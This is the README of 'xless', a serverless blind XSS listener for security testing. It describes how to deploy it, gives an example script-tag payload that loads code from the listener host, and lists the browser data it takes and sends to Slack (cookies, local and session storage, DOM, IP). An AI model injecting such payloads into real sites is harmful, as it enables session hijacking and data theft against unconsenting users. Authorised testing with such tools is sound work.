XLESS
======

# The Serverless Blind XSS App

## About The Project
xless is a serverless blind XSS app that can be used to identify blind XSS vulnerabilities using your own deployed version of the app. There is no need to run a full deployment process; just setup a zeit.co account and run `bash deploy.sh`. That's it. You have a fully-running Blind XSS listener that uses Slack to notify you for blind XSS callbacks.


## Requirements

* zeit.co account: Zeit provides free plan for serverless. If you use another provider for serverless, code changes should be minimal.
* Slack Incoming Webhook URL.


## Deployment

1. Run:

```bash
$ bash deploy.sh

> Deploying ~/xless under X
> https://xless.now.sh [v2] [in clipboard] [4s]
> Success! Deployment ready [4s]
```
2. Use the URL for blind XSS testing :fire:

**Xless will automatically serve the XSS payload, collect information, and exfiltrate it into your serverless app, which is then sent right to you in Slack.**


## Example Payload

```javascript
<script src="https://xless.now.sh"></script>
```


## Demo
![Demo](https://raw.githubusercontent.com/mazen160/public/master/static/images/xless-screenshot.png)


# Collected Data

* Cookies
* User-Agent
* HTTP Referrer
* Browser DOM
* Browser Time
* Document Location
* Origin
* LocalStorage
* SessionStorage
* IP Address


## Contribution
Contribution is very welcome. Please share your ideas by Github issues and pull requests.

Here are some ideas to start with:
1. Enabling sharing of page screenshot - Check `test.payload.js`.
2. A nice logo design!
3. _Your idea of a new feature_?


## Acknowledgement

* Matthew Bryant (https://github.com/mandatoryprogrammer) for the XSS Hunter project.
* Rami Ahmed (https://twitter.com/rami_ahmad) for the "xless" name idea.
* Zeit.co for operating a great serverless platform.


## Legal Disclaimer
This project is made for educational and ethical testing purposes only. Usage of xless for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.


## License
The project is currently licensed under MIT License.

## Author
*Mazin Ahmed*
* Website: [https://mazinahmed.net](https://mazinahmed.net)
* Email: *mazin AT mazinahmed DOT net*
* Twitter: [https://twitter.com/mazen160](https://twitter.com/mazen160)
* Linkedin: [http://linkedin.com/in/infosecmazinahmed](http://linkedin.com/in/infosecmazinahmed)
